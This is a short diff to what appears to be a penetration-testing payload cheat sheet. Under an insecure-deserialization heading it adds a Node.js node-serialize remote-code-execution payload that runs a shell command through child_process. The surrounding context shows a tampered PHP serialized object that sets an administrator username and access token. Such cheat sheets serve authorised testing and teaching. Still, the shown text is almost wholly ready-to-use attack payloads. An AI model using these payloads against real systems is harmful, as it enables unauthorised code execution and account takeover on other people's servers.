@@ -1086,7 +1086,11 @@ while stop == False:
 
 
 # Insecure deserialization
+### Node.js deserialization vulnerability payload [RCE]
 
+```js
+{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
+```
 ### Modifying serialized data types
 ```js
 O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
